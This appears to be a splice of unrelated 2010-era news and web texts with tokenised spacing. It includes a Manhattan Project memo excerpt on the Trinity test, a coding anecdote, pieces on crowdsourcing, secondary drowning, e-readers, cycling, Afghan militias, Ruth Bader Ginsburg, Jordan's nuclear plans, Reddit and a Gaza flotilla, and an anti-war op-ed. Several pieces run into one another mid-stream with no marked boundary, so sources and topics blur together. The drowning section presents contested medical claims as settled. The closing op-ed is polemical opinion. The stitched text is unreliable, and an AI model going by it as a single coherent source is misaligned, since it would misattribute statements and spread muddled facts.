The events that took place in a remote area of New Mexico during the predawn hours of July 16 , 1945 forever changed the world .
In the early morning darkness the incredible destructive powers of the atom were first unleashed and what had been merely theoretical became reality .
The test was the culmination of three years ' planning and development within the super secret Manhattan Project headed by General Leslie R. Groves .
Dr. J. Robert Oppenheimer directed the scientific team headquartered at Los Alamos , New Mexico .
An isolated corner of the Alamogordo Bombing and Gunnery Range located 230 miles south of Los Alamos was selected for the test that was given the code - name " Trinity . "
Even before the bomb was tested , a second bomb was secretly dispatched to the Pacific for an attack on the Japanese city of Hiroshima .
Preparations for the test included the building of a steel tower that would suspend the bomb one hundred feet above ground .
Many were apprehensive - there were concerns that the blast might launch a cataclysmic reaction in the upper atmosphere leading to world destruction .
Some feared the consequences of radio- active fallout on civilian populations surrounding the test site .
Still others feared the test would be an outright dud .
Observers were sent to surrounding towns to monitor the results of the blast and medical teams were kept on alert .
Finally , the rains that had delayed the test for almost two weeks subsided and in the darkness of that July morning history was made .
" We were reaching into the unknown and we did not know what might come of it . "
Two days after the blast , General Groves , head of the Manhattan Project , sent a Top Secret memorandum to Secretary of War Stimson detailing the events of that morning .
Groves included the description of General Thomas Farrell who was in an observation hut close to the blast along with a hand - full of scientists and other personnel .
We join General Farrell 's account a few hours before the explosion : ADVERTISMENT
" The scene inside the shelter was dramatic beyond words .
In and around the shelter were some twenty - odd people concerned with last minute arrangements prior to firing the shot .
Included were : Dr. Oppenheimer , the Director who had borne the great scientific burden of developing the weapon from the raw materials made in Tennessee and Washington and a dozen of his key assistants - Dr. Kistiakowsky , who developed the highly special explosives ; Dr. Bainbridge , who supervised all the detailed arrangements for the test ; Dr. Hubbard , the weather expert , and several others .
Besides these , there were a handful of soldiers , two or three Army officers and one Naval officer .
The shelter was cluttered with a great variety of instruments and radios .
For some hectic two hours preceding the blast , General Groves stayed with the Director , walking with him and steadying his tense excitement .
Every time the Director would be about to explode because of some untoward happening , General Groves would take him off and walk with him in the rain , counseling with him and reassuring him that everything would be all right .
At twenty minutes before zero hour , General Groves left for his station at the base camp , first because it provided a better observation point and second , because of our rule that he and I must not be together in situations where there is an element of danger , which existed at both points .
Just after General Groves left , announcements began to be broadcast of the interval remaining before the blast .
They were sent by radio to the other groups participating in and observing the test .
As the time interval grew smaller and changed from minutes to seconds , the tension increased by leaps and bounds .
Everyone in that room knew the awful potentialities of the thing that they thought was about to happen .
The scientists felt that their figuring must be right and that the bomb had to go off but there was in everyone 's mind a strong measure of doubt .
The feeling of many could be expressed by '' Lord , I believe ; help Thou mine unbelief . '
We were reaching into the unknown and we did not know what might come of it .
It can be safely said that most of those present - Christian , Jew and Atheist - were praying and praying harder than they had ever prayed before .
If the shot were successful , it was a justification of the several years of intensive effort of tens of thousands of people statesmen , scientists , engineers , manufacturers , soldiers , and many others in every walk of life .

In that brief instant in the remote New Mexico desert the tremendous effort of the brains and brawn of all these people came suddenly and startlingly to the fullest fruition .
Dr. Oppenheimer , on whom had rested a very heavy burden , grew tenser as the last seconds ticked off .
He scarce breathed .
He held on to a post to steady himself .
For the last few seconds , he stared directly ahead and then when the announcer shouted ' Now ! ' and there came this tremendous burst of light followed shortly thereafter by the deep growling roar of the explosion , his face relaxed into an expression of tremendous relief .
Several of the observers standing back of the shelter to watch the lighting effects were knocked flat by the blast .
The tension in the room let up and all started congratulating each other .
Everyone sensed ' This is it !'
No matter what might happen now all knew that the impossible scientific job had been done .
Atomic fission would no longer be hidden in the cloisters of the theoretical physicists ' dreams .
It was almost full grown at birth .
It was a great new force to be used for good or for evil .
There was a feeling in that shelter that those concerned with its nativity should dedicate their lives to the mission that it would always be used for good and never for evil .

Dr. Kistiakowsky , the impulsive Russian , [ actually an American and a Harvard professor ] threw his arms around Dr. Oppenheimer and embraced him with shouts of glee .
Others were equally enthusiastic .
All the pent - up emotions were released in those few minutes and all seemed to sense immediately that the explosion had far exceeded the most optimistic expectations and wildest hopes of the scientists .
All seemed to feel that they had been present at the birth of a new age - The Age of Atomic Energy - and felt their profound responsibility to help in guiding into right channels the tremendous forces which had been unleashed for the first time in history .
As to the present war , there was a feeling that no matter what else might happen , we now had the means to insure its speedy conclusion and save thousands of American lives . "

Please program in more days , read the subject of one of Peter 's unread e-mails .
As the replacement for Noah , the company 's veteran programmer , Peter was starting to get used to strange - sounding emails requesting simple hacks and tweaks to applications used by their clients .
He opened up the message ...
Hey Peter --
Could you add more days into our transaction age report ?
Not sure if that makes any sense , but Noah had to do this whenever we wanted to run against longer periods .
After a little bit of investigating , Peter found out why they were running out of days ...
' Calculate days / hours based on total ' Hopefully , we wont need to go ' more granular than 12 h If totalHours <= 12 Then dayCount = 0 hourCount = 12 ElseIf totalHours <= 24 Then dayCount = 1 hourCount = 0 ElseIf totalHours <= 36 Then dayCount = 1 hourCount = 12 ElseIf totalHours <= 48 Then dayCount = 2 hourCount = 0 ... and so on ...
ElseIf totalHours <= 744 Then dayCount = 31 hourCount = 0 ElseIf totalHours <= 756 Then dayCount = 31 hourCount = 12 Else dayCount = 99999 hourCount = 99999 End If
Peter told them that he'd fix it so they would never " run out of days " and asked if they 'd like to see more accuracy than 0 or 12 hours .
Their response was priceless : Really ???
You can do that under a support call ?!?!
We 'd love that ;
Noah said it would take thousands of codes to do that .

A problem shared is a problem halved , goes the old saying .
But what happens if you share a problem with millions of people ?
Are you left with a millionth of a problem ?
Or just lots of rubbish suggestions ?
Both the British government and BP have recently called on the public to help them sort out a mess .
Chancellor George Osborne asked for tips on programmes to be cut to trim the huge budget deficit , while deputy prime minister Nick Clegg wants us to suggest " silly " laws that can be repealed .
And the ongoing Deepwater Horizon oil spill in the Gulf of Mexico prompted BP to call on Joe Public for ideas to stem the flow of oil after its in - house solutions failed .
So far BP 's corporate Mayday has elicited more than 20,000 suggestions .
This is the most ambitious online crowd sourcing exercise ever attempted by any British government .
It is an entirely new way for government to engage with people .
Nick Clegg Clegg calls for law repeal ideas Public ' want quangos and aid cut '
In trendy parlance , such appeals for outside help are known as crowdsourcing , a term that Mr Clegg made sure to name check in his appeal .
So what is crowdsourcing ?
Anthony Williams , co-author of Wikinomics : How Mass Collaboration Changed Everything , says examples are everywhere .
Open source computer operating systems , such as Linux and Google 's Android , the big rival to Apple 's iPhone , are written and refined by members of the public .
Another good example of such collaboration is Wikipedia , which allows users to write and edit entries for its online encyclopaedia : " For the first time millions of people can aggregate their talent and expertise , " says Williams .
" Previously the assumption had been you had to create a company .
Here is something completely different . "
There are numerous modern examples of how collaboration has transformed businesses , Williams says .
One good recent example is that of the Canadian mining company Goldcorp , which was struggling financially and unable to find gold on its land in northern Ontario .
When a new chief executive arrived he put all its geological data online , asked for help on where the gold was located and put up $ 500,000 in prize money for accurate suggestions .
Striking $ 3bn of gold " They got submissions from people all over the world , including people using 3D computer modelling techniques .
They found $ 3bn worth of gold on the property and Goldcorp became one of Canada 's biggest mining companies . "
PERFECT MATCH
Is crowdsourcing just the old employees ' suggestions box reinvented ?
One famous legendary business story - which may be urban myth - relates how an employee suggested to the matchmaker Swan Vestas that they could have one instead of two sandpaper strips on the matchbox
The company listened to the lateral thinking and reaped the benefits in lower costs
It 's just one of a number of examples of how opening a problem out to the public and away from a small pool of workers can lead to huge gains , Williams says .
" These things happen a lot .
You 're making a problem accessible to a large range of people with a diverse range of skills .
And it turns out it 's not just for companies it applies to government as well . "
The idea is gaining traction in the normally more conservative corridors of the public sector , says Natalie Evans , deputy director of think tank Policy Exchange .
" We now have the technology to reach a huge pool of talent and ideas from the general public in way that simply was n't possible before .
Done properly , this means we can leverage mass collaboration in a way that fosters a sense of ' public buy - in ' .
" This can be particularly important where - say in the case of deciding where the axe must fall in terms of cutting public spending - there are difficult decisions to be made . "
Seeking ideas is one thing ?
But how willing are those in power to act on the public 's suggestions ?
The point is neatly made in the findings of a survey published on Monday about where spending cuts should be .
Some 2,000 members of the public were asked for their suggestions and one of the most popular targets was Britain 's overseas aid budget .
Yet this , along with healthcare , is an area the government has pledged not to touch .
Perry Walker , head of participation at the New Economics Foundation , believes crowdsourcing works well for ideas , less well for how you develop them .
PR is consultative clothing " Brain storming works best when people do n't talk to each other because people inhibit each other .
But then what happens when you 've got the ideas ?
You could have 30,000 ideas on what laws to repeal . "
At this point smaller groups of committed citizens must be given a chance to filter and discuss the ideas , he says .
Transparency and feedback are also crucial if the public is not to become cynical , he warns .
Geoff Mulgan , commentator and director of thinktank the Young Foundation ' Crowdsourcing is already being used extensively - the World Bank used it in Haiti , the firm Innocentive now has hundreds of thousands of scientists on tap to solve problems for a fee , and New Zealand briefly tried it for police legislation .
So far reality has n't caught up with the promise - and good strategic policy making involves deliberation , which the existing crowd - sourcing models are n't suitable for .
But for more discrete and practical problem - solving it undoubtedly has a lot to offer . '
In fact , there is a question about whether what Mr Clegg and BP have done is genuine crowdsourcing at all .
Crowdsourcing , says Stephen Overell , associate director of the Work Foundation , is really about using looser , freelance forms of commissioning tasks , allowing an organisation to tap into a much wider pool of knowledge or specialist skills .
BP 's effort is more about public relations - appearing to be responsive , says Overell .
" BP has handled the oil leak atrociously .
So its priority is public relations first and the need for high quality information second , in that order .
20,000 ideas is unmanageable , you 'll need all sorts of procedures for sorting through them .
Solving this sort of issue is a profoundly technical issue that the vast majority of people are ill equipped for . "
And asking for ideas in this way is not new - the employee suggestion box has been around for years and is actually far more useful than what either the government or BP is up to , he argues .
" The best ideas of how to solve a problem usually come from employees , although it 's probably best done through technology now rather than a box . "
But it only works if there is a genuine interest from management - " too often over time it becomes a silly gimmick that you feel you have to do . "
Another sceptic is Peter Kellner , who as president of polling company YouGov , is well used to listening to the views of ordinary members of the public .
Embarrassment
He doubts Nick Clegg 's call to arms will elicit anything civil servants could n't have come up with .
And what 's worse , the government will end up with egg on its face .
Populist open - ended gestures like this normally end in embarrassment , says Kellner .
" The last government allowed people to put up petitions on the Number 10 website and it quickly got out of hand with Jeremy Clarkson for prime minister .
It 's an invitation to idiocy and madness and an opportunity for lobby groups . "
Surprisingly , Anthony Williams , whose follow up to Wikinomics is published later this year , agrees .
" The White House tried crowdsourcing when Obama first came in .
They asked the public what its main priorities should be .
Legalising marijuana came up number one . "
For that reason , the term crowdsourcing has become unpopular with some of those like Wikipedia founder Jimmy Wales who one would expect to support it .
" The problem with the term is the notion of a crowd - this amorphous crowd has no individual perspective .
There 's value in mass participation but where possible the people need some expertise .
We just call it collaboration frankly . "
Add your comments on this story , using the form below .
The sort of thinking that Mr Williams exhibits is the reason crowdsourcing ideas for government are bound to fail .
Anything radical or outside - the - box are too much for politicians to handle .
Maybe legalising marijuana WAS the American people 's top priority .
Maybe by legalizing it the US govt would have solved a lot of problems .
Another opportunity missed .
Rupert , Brussels I can't remember who said it , but in situations like this , I think it 's a good idea to remember the saying , " The IQ of a crowd is the lowest individual IQ divided by the number of people in the crowd " .

In 2008 , a ten - year - old boy in South Carolina died in his bed an hour after swimming in a pool for the first time .
His death was attributed to a phenomenon known as secondary drowning .
This condition can be difficult to recognize , since the victim initially appears to be OK after a near - drowning incident .
In some cases , however , enough water has entered the lungs to cause a drop in blood oxygen levels , and death may occur between one and 48 hours later .
This condition is sometimes confused with dry drowning , in which a laryngospasm causes suffocation .
Inhaling water can leave fluid in the lungs and may cause secondary drowning .
Contrary to popular belief , drowning does not necessarily involve a wholesale ingestion or aspiration of water or other fluids .
During cases of secondary drowning , very little fluid is actually present in the victim 's lungs .
This small amount of liquid is still enough to make the lungs no longer able to deliver life - sustaining oxygen to the bloodstream , however , and the victim eventually succumbs to the lack of oxygenated blood .
Death is generally attributed to a pulmonary edema , similar to the effects of acute pneumonia or wet drowning .
Only a small amount of fluid in the lungs can cause secondary drowning .
One thing which makes this condition so difficult to detect is its slow acting nature .
A victim may breathe in a very small amount of fluid and believe he or she has successfully expelled it through coughing .
In reality , the water may fill up some of the oxygen - rich pores of the lungs , reducing the lungs ' ability to oxygenate the blood as it passes through .
The heart does not slow down appreciably during this process , so the victim can still walk and talk .
The only symptoms may be a sudden change in personality or level of awareness as the blood oxygen level drops over time .
Pulmonary edema refers to a medical condition characterized by the build up of fluid around the lungs .
Victims may or may not feel the effects of secondary drowning immediately .
Children and anyone who has experienced a near - drowning should be watched closely after leaving a swimming area .
Vomiting or involuntary defecation immediately following a swimming session should be considered a red flag .
A sudden change in personality or energy level , such as agitation or extreme lethargy , may be a sign of oxygen deprivation .
If a child has inhaled water while swimming , he or she should be observed for several hours for signs of labored breathing or altered mental status .
Successful treatment for victims depends on a swift response and a quick diagnosis by trained medical personnel .
Secondary drowning may later strike a patient who appears to be fine after a near - drowning incident .
Often confused with secondary drowning is a condition called dry drowning .
Although this condition has a number of causes , it can occur in a near - drowning incident , when the larynx closes to prevent the person from inhaling water or other fluids ; this reflex action is known as a laryngospasm .
Ordinarily , this laryngospasm should only last 30 to 60 seconds , but in the case of dry drowning , it can continue for several minutes .
Meanwhile , the diaphragm drops , creating a partial vacuum in the lungs .
Instead of drawing in a breath of outside air , however , this action pulls more oxygen - starved blood into the lungs .

Each day a different image or photograph of our fascinating universe is featured , along with a brief explanation written by a professional astronomer .
2010 July 22
The Meteor of 1860 by Frederic Church
Courtesy : Judith Filenbaum Hernstadt ( painting photographed by Gerald L. Carr )
Explanation : Frederic Church ( 1826-1900 ) , American landscape painter of the Hudson River School , painted what he saw in nature .
And on July 20th , 1860 , he saw a spectacular string of fireball meteors cross the Catskill evening sky , an extremely rare Earth - grazing meteor procession .
From New York City , poet Walt Whitman ( 1819 - 1892 ) also wrote of the " ... strange huge meteor procession , dazzling and clear , shooting over our heads " in his poem Year of Meteors ( 1859 -60 ) .
But the inspiration for Whitman 's words was forgotten .
His astronomical reference became a mystery , the subject of scholarly debate until Texas State University physicists Donald Olson and Russell Doescher , English professor Marilynn Olson , and Honors Program student Ava Pope , located reports documenting the date and timing of the spectacular meteor procession .
The breakthrough was spotting the connection with Church 's relatively little - known painting .
Fittingly , the forensic astronomy team 's work was just published , on the 150th anniversary of the cosmic event that inspired both poet and painter .
E-readers are far from dead but many are certainly gasping for breath .
A shake - out in the e-reader market has put some smaller companies out of business , leaving the playing field clear for giants like Amazon , Barnes & Noble and Sony .
The list of e-reader makers running into trouble has grown in the past few weeks :
Audiovox has canceled plans to introduce the RCA Lexi e-reader that it demonstrated at the Consumer Electronics
Show this year .
Last month , e-reader maker iRex filed for bankruptcy , citing disappointing sales of its product in the United States .
Plastic Logic , which also debuted its large screen reader at CES in January , has canceled all pre-orders for its device and scrapped plans to ship the product .
Cool - er , one of the earliest startups to launch a Sony look - alike e-reader , has listed all its products as " out of the stock " in the United States with no mention of when new devices will be available .
" Companies that had neither brand nor distribution have failed , " says Sarah Rotman Epps , an analyst for Forrester Research .
Price cuts by Amazon and Barnes & Noble , coupled with the shift in consumer interest toward more multi-purpose tablets , have also taken their toll on e-readers .
" You are seeing the same kind of proliferation and excitement in tablets now that you saw two years ago for e-readers , " says Epps .
After Amazon introduced the Kindle in 2007 , e-readers became one of the hottest consumer products .
The category attracted large companies such as Samsung and Barnes & Noble , even as lesser - known players such as Plastic Logic , Aluratek and iRiver jumped in .
Mostly Kindle clones , many of these e-readers were near - identical in how they looked and the features they offered .
Almost all sourced their black - and - white screen from a single company : E Ink .
Meanwhile , Apple launched its iPad this year .
At $ 500 , it 's pricier than most e-readers , but offers relatively long battery life , a color screen and iBooks , an iTunes - like store for digital books .
It may not be as ideally suited to reading as a dedicated e-reader , but many iPad customers are finding that it works well enough as a book reader , in addition to its many other functions .
Apple 's move sparked a price war in the e-reader market .
Amazon dropped the price of its Kindle 2 to $ 190 from $ 260 .
Barnes & Noble released a Wi-Fi-only version of the Nook for $ 150 , while a Nook with Wi-Fi and 3G capability now costs $ 200 .
The price war put a squeeze on smaller e-reader manufacturers .
" As a result of the recent price drops in the market , our primary focus has shifted to international opportunities , " Audiovox told the Digital Reader website .
All this does n't mean consumers have completely fallen out of love with e-readers , says Epps .
Tablets will outpace e-readers in overall sales , she says , but the shift toward digital books is here to stay .
Forrester estimates 6.6 million e-readers will be sold in the United States this year .
Approximately 29.4 million e-readers may be sold in the United States by 2016 , compared to 59 million tablets .
Earlier this week , Amazon said for the first time sales of e-books are outstripping hardcovers .
In June , Amazon sold 180 e-books for every 100 hardcovers .
In the first six months of the year , the company sold three times as many e-books as it did in the first half of 2009 .
" In the e-reader market , price is coming way down and that 's the major consideration for purchase , " says Epps .
" If a company can do cheaper and better devices than Amazon , Sony or Barnes & Noble , they still have a chance – but no one 's been able to do that yet . "

Obviously I could n’t keep off this one — not the way the Internet exploded following Renshaw ’s ejection .
It was n’t entirely an otherwise unremarkable stage , but most of this focuses on the final few meters .
[ click for iPad/iPhone / downloadable version ]
[ Contains , in order of appearance , footage from Eurosport , Versus and NOS , and still photos from Graham Watson , Pascal Pavan , Eric Gaillard , Lauren Rebours and Fotoreporter Sirotti . ]
I said almost immediately — and have the audio to prove it — that I thought Renshaw would get relegated for closing the gate , but I think the race jury wanted some way of punishing Cavendish for the actions of his leadout man , and so bumped Renshaw from the race .
The Aussie ’s been fantastic all Tour long — it ’ll be interesting to see how things shake out without him .
No shortage of opinion on this one , ranging from no sanction should be given to no headbutting should be allowed ever in any sport .
I obviously think I ’m right , but please do n’t feel bound to defer to my feelings on the subject .
Versus did a great job of getting reaction interviews moments after the finish : here ’s Dean , Farrar , and Renshaw .

Why Hire a Board Certified Attorney ?
We have all heard the old adage that “ You Get What You pay For ” .
This truism holds up pretty well when the topic concerns most consumer goods like cars , shoes , sofas , etc .
But what does “ You get what you pay for ” mean when hiring an attorney on a contingency fee basis for your personal injury case ?
Under a contingency fee , you are not charged a legal fee from the attorney unless and until we obtain a recovery for you , such as a negotiated settlement or jury verdict .
The amount of the fee is a fixed percentage of the amount of the recovery .
So if all personal injury lawyers are basically using the same fee structure , does this mean you can expect the same results no matter whom you use for your attorney ?
Of course you know the answer is “ no . ”
But how do you know whether the attorney you hire has the knowledge , skills and ability to get you the best results ?
One way to know is by hiring an attorney who is Board - Certified in Civil Trial Law .

Sure , you read reviews and take recommendations from friends before you buy a new cellphone , but have you ever stopped to consider what the inventor of the cellphone uses on a daily basis ?
C-SPAN has , and recently took the opportunity to ask the man himself , Marty Cooper , that very question during a wide - ranging interview .
While Cooper said that he has used an iPhone previously , he recently passed it on to his grandson in favor of a Motorola Droid , which he says he chose because he wanted to get more experience with Android .
But that 's not all , Cooper also revealed that he carries a Jitterbug as well for when he just wants to make phone calls .
Surprising for a pioneer of mobile technology ?
Not exactly , as Cooper actually co-founded Jitterbug with his wife , who he credits with inventing the phone .

KABUL , Afghanistan 
After intensive negotiations with NATO military commanders , the Afghan government on Wednesday approved a program to establish local defense forces that American military officials hope will help remote areas of the country thwart attacks by Taliban insurgents .
Details of the plan are sketchy , but Americans had been promoting the force as a crucial stopgap to combat rising violence here and frustration with the slow pace of training permanent professional security forces  the bottom - line condition for the American military to begin pulling back from an increasingly unpopular war .
Many parts of Afghanistan have no soldiers or police officers on the ground .
Over 12 days of talks , Gen. David H. Petraeus , the new NATO commander , overcame the objections of President Hamid Karzai , who had worried that the forces could harden into militias that his weak government could not control .
In the end , the two sides agreed that the forces would be under the supervision of the Afghan Interior Ministry , which will also be their paymaster .
“ They would not be militias , ” said Geoff Morrell , the Pentagon spokesman , at a briefing in Washington on Wednesday .
“ These would be government - formed , government - paid , government - uniformed local police units who would keep any eye out for bad guys  in their neighborhoods , in their communities  and who would , in turn , work with the Afghan police forces and the Afghan Army , to keep them out of their towns . ”
' We will never go back to the way it once was , ' Ginsburg says .
Ginsburg : Roe will hold
ASPEN , Colo . — Supreme Court Justice Ruth Bader Ginsburg declared Thursday that abortions would continue to be available to women regardless of the legal challenges now being waged by opponents of Roe v. Wade .
" Over a generation of young women have grown up , understanding they can control their own reproductive capacity , and in fact their life 's destiny , " Ginsburg said in rare public remarks .
" We will never go back to the way it once was . "

Ginsburg said that any changes in access to abortion simply hurts poor women .
" If people realize that , maybe they will have a different attitude , " she said .
In a wide - ranging 45 - minute discussion here at the Aspen Ideas Festival , Ginsburg spoke about the collegial relationship among justices on the court , her role in bolstering women 's rights , her long ties to nominee Elena Kagan and the recent death of her husband of 56 years , Marty .
On her own health , the 77 - year - old Ginsburg said : " I 'm just fine , " despite being diagnosed with pancreatic cancer last year .
In deeply personal comments , Ginsburg opened her remarks praising her late husband for his open - minded nature , for being a good cook and for being the " smartest man I knew . "
Recalling their early times together , she called her husband " the first boy I met that cared that I had a brain . "
And she noted that when she was in Harvard law school , there were nine female and over 500 male students , and just five female students when her husband was a student there .
The discussion started with an extraordinary introduction by the first woman Supreme Court justice , the retired Sandra Day O'Connor , who said that Ginsburg grew up in an era when women had a hard time getting employment .
And she said that Ginsburg is " looking forward to now getting another woman on the court , " referring to Kagan , who would join Ginsburg and Justice Sonia Sotomayor if she 's confirmed this summer .
Ginsburg told journalist Jeffrey Rosen , who moderated the discussion , that she met Kagan when the nominee was clerking for federal judge Abner Mikva .
And she later grew to know Kagan in 1993 when she was nominated to the Supreme Court and Kagan — as a counsel to then - Senate Judiciary Committee Chairman Joe Biden — helped him prepare for the hearings by reading all of her past speeches and writings .
" He wanted to appear very well - prepared for the hearings , " Ginsburg said of Biden .
Ginsburg later noted how Kagan followed Ginsburg 's tack by remaining noncommittal in her confirmation hearings — despite Kagan 's 1995 law review article where she harshly criticized Ginsburg and Justice Stephen Breyer for not divulging their views entirely .
Ginsburg said the 50 - year - old Kagan had grown " older and wise , " and " steered the same course as we did " in her confirmation hearings .
And she said she sent Kagan a note saying that the two qualities at the confirmation that would suit her well would be her " patience " and " sense of humor , " and Ginsburg said she succeeded at both .
" There 's no work place that I find more collegial than the U.S. Supreme Court , " Ginsburg said .
And she noted the goodwill she received from her colleagues after her first bout of cancer in 1999 .
At the time , she said , then - Justice David Souter said he would do anything to help her out — so Ginsburg asked him to accompany her to the opera at the Kennedy Center , despite his longtime resistance to going there .
" He enjoyed it enormously , but he never came back , " she said .
In private meetings with justices , Ginsburg said , " there 's no horse trading " when it comes to deciding on how to vote on cases .
But she said justices are " constantly trying to persuade each other " to change their minds .
About twice a term , she said , the final opinion is different from how the justices telegraph their votes in private meetings , making lobbying for votes critical .
But Ginsburg — a fierce liberal on the court — declined to criticize the court 's conservative majority , particularly in this year 's Citizen United case that opened the door for increased corporate and union spending in elections .
Asked if Chief Justice John Roberts wanted to rule narrowly in cases , Ginsburg said , " I ca n't answer that question , " saying that Roberts and the other justices in the majority in Citizens United believed they were upholding First Amendment rights .
Jordan 's King Abdullah accused Israel on Tuesday of trying to prevent his kingdom from developing a peaceful nuclear program , aimed at producing energy .
Open gallery view King Abdullah II of Jordan delivering a speech in Amman on June 8 , 2010 .
Credit : AP
The king revealed in an interview with the Wall Street Journal that Israel had approached South Korea and France with requests to refrain from selling Jordan nuclear technology .
Israel 's " underhanded " actions are adding tension to already strained relations with Jordan , bringing ties between the two countries to their lowest point since they signed a peace agreement in 1994 , the king said .
" There are countries , Israel in particular , " Abdullah told the Wall Street Journal , " that are more worried about us being economically independent than the issue of nuclear energy , and have been voicing their concerns . "
" There are many such reactors in the world and a lot more coming , so [ the Israelis must ] go mind their own business , " he added .
Israeli officials denied any action to prevent Jordan from developing nuclear energy .
Jordan is planning to erect four nuclear reactors within its territory and is currently negotiating the issue with South Korea , France and the U.S.
The country currently most likely to aid Jordan 's nuclear endeavor is the U.S .
Enormous deposits of uranium ore have been recently discovered in the deserts near Amman , and Jordan plans to utilize them .
However , the U.S. is demanding that Amman not produce its own nuclear fuel , and is conditioning the sale of nuclear reactors on Jordan 's purchase of nuclear fuel in the global market .
Jordan argues that as a signatory of the United National key nonproliferation treaty , it has a right to produce its own nuclear fuel , and is reluctant to relinquish this right as it plans to use the uranium deposits to boost Jordan 's economy .
According to Jordan , any attempt to force it not to utilize its own uranium would violate the treaty and harm its economic interests .
Jordan 's economic vision is to export both uranium and electricity produced in nuclear reactors to neighboring countries such as Syria or Iraq .
The user community of news - aggregation website Reddit has taken a call to arms after site owner Condé Nast stated it would not run advertisements promoting California ’s Proposition 19 , which would legalize marijuana under certain restrictions .
Instead of using the online ad space to generate revenues , Condé Nast is now facing an army of “ Redditors , ” as the site ’s active participants are known , placing what amounts to free advertising for Proposition 19 on the site ’s homepage .
Eight of the top 25 posts on Reddit are now images that promote the proposition .
The top overall post ?
“ YES to Prop 19 ; NO to corporate censorship . ”
The official statement by Condé Nast is that it ” does not want to benefit financially from this particular issue . ”
As a compromise , Reddit staffers have reversed the ban and are running pro-Proposition 19 ads without charge .
Reddit operates as a news aggregator that allows users to “ upvote and downvote ” news stories , links and self - written posts , similar to Digg and others .
The top-voted links make it to the front page , and users can do the same with comments written for each individual link .
Reddit was launched in 2005 after getting backed by Silicon Valley startup incubator Y Combinator .
It was acquired by media supergiant Condé Nast in 2006 .

The UN said Friday that organizations wishing to deliver aid to the Gaza Strip should do so by land and not attempt to break the Israeli blockade of the territory by sea with flotillas , AFP reported .
UN spokesman Martin Nesirky made the statement at a press briefing amid reports that a flotilla of two vessels from Lebanon was planning to leave for Gaza on Friday or Saturday .
" Our stated preference has been and remains that aid should be delivered by established routes , particularly at a sensitive time in indirect proximity ( peace ) talks between Palestinians and Israelis , " said Nesirky .
Defense Minister Ehud Barak said Friday that the planned Lebanese flotilla is an “ unneccsary provocation ” and Israel holds the Lebanese government responsible to prevent the ships from trying to sail to break the Israel - imposed sea blockade on Gaza .
The Israel Navy was on high alert on Friday amid predictions that a flotilla of two vessels from Lebanon were preparing to depart for the Gaza Strip in an effort to break the Israel - imposed sea blockade by the end of the week .
Barak said that if the cargo the ships were carrying was of a humanitarian nature it would be allowed into Gaza via the Ashdod Port and land crossings Israel controls into Gaza .
“ If the ships refuse to accompany the Navy to Ashdod , we will have no choice but to stop it at sea , ” Barak said .
Defense officials said that the Navy had deployed ships at sea to stop the Lebanese boats and that teams of commandos from the Navy ’s Flotilla 13 – known as the Shayetet – were put on standby in case they would be needed to board the ships and prevent them from sailing into the Gaza Strip .
The organizer behind the ships is Yasser Kashlak , a Syrian national of Palestinian origin .
Two ships are expected to depart Tripoli on either Friday or Saturday to try and break the blockade .
One of the ships is carrying women and the other is carrying journalists .

The time has come to justify anew the war in Afghanistan , and excuses for keeping American and other NATO troops in combat there are coming hot and heavy in Washington and London .
Last month ’s trillion dollar mineral bonanza was not enough .
Nor was the changeover of military command from an apparently insolent general to one who minds his Ps and Qs. Uncertain successes on the battlefield are not doing much to help .
So , how can the Obama administration sell this despicable war to an increasingly wary public ?
The latest rabbit in the magician ’s top hat is the creation of “ local police units , ”  home guards to keep the Taliban away from the villages .
Announced with great fanfare in Kabul and Washington , a new plan calls for village militias to turn the tide .
( If you believe that , please send me a check for $ 10,000 for the name of the next Kentucky Derby winner . )
These militiamen are unlikely to do anything more than denounce their traditional enemies to death squads , making them as unpopular as the Green Berets they are going to serve under .
Minerals , new commanders , new local collaborators , new strategies .
All are failing , not only to win the war , but to persuade the American and European public to support it .
What else is left ?
Alas , women .
Just when you thought there was no reason to prolong the nine - year war in central Asia , along comes a new excuse .
A CIA memorandum of 11 March , “  Afghanistan : Sustaining West European Support for the NATO - led Mission “  Why Counting on Apathy Might Not Be Enough , ”  ( posted on Wikileaks ) puts the propagandists ”  case : “  Afghan women could serve as ideal messengers in humanizing the ISAF [ International Security Assistance Force ] role in combating the Taliban because of women ’s ability to speak personally and credibly about their experiences under the Taliban , their aspirations for the future , and their fears of a Taliban victory .
Outreach initiatives that create media opportunities for Afghan women to share their stories with French , German , and other European women could help to overcome pervasive skepticism among women in Western Europe toward the ISAF mission . ” 
Hey , if no one is marching to Washington ’s drumbeat on defeating terrorism , why not change the tune to “  I Am Woman ”  ?
Representative of the latest barrage of Afghan apologetics was a recent op ed in the International Herald Tribune ( 15 July 2010 ) by Thea Garland , who urged the US to stay the course in order to protect Afghan women .
She quotes Hilary Clinton , “  Women ’s rights are human rights . ” 
This would appear to justify the expenditure of lives and treasure in a land that has an unlimited capacity to absorb both .
Ms. Garland reminded readers of the Taliban ’s reprehensible record on women : denying them education , abusing them for laughing aloud , forcing them to dress in a certain way and even executing some in a football stadium for minor infractions of Taliban rules .
That such things happened under the Taliban is true , just as it is likely a restored Taliban will behave no more humanely than did the shock troops of Mullah Omar .
However , Ms. Garland and others make no mention of the abuses of women by Afghan society at large and especially by the militias of the Northern Alliance who allied themselves to the United States in 2001 .
One of these , General Abdul Rashid Dustom ’s Uzbek militia , systematically raped women in the Pashtun district of Balkh .
Neither the American force commanders nor President Karzai objected to Dustom taking a place in the Afghan cabinet or maintaining control of his fiefdom in the north , where torture of men and women is a fact of daily life .
Another rapacious enemy of women was the Hazara militia of Muhammad Mohaqiq , now another respected leader of the pro-American polity in Kabul .
Back in the 1980s , the Soviets urged Afghan men to accept female equality , sponsored schools for girls and permitted women to work .
Where are those schools and jobs today ?
Well , the militias that overthrew the pro-Soviet regime of President Mohammed Najibullah eliminated them .
Under Najibullah , women exercising their civil and sartorial rights feared no one more than the “ freedom fighters , ”  who sprayed their uncovered faces in acid .
Material and propaganda support for those lovers of freedom came from the administration of President Ronald Reagan , Charlie Wilson ’s buddies in Congress and that great liberal democracy with a record of unparalleled service to womankind , the Kingdom of Saudi Arabia .
Any element in a society that depends on an unwelcome foreign occupier becomes the object of revenge when the occupier departs .
This happened to the right - wingers in post - Vichy France , the Harkis when the French left Algeria and to the Hmong when the US pulled out of southeast Asia .
It will happen again to Afghan women , because no one remembers their suffering after the Soviets left them to the mercy of the mujahedeen that the US and Saudi Arabia helped into power .
Post - Soviet Afghanistan under America ’s friendly warlords descended into such deadly chaos that much of the public demanded rescue from groups of students who came to be known as the Taliban .
“ We must not abandon them again , ”  Ms. Garland writes of Afghanistan ’s beleaguered women .
Yet who are we ?
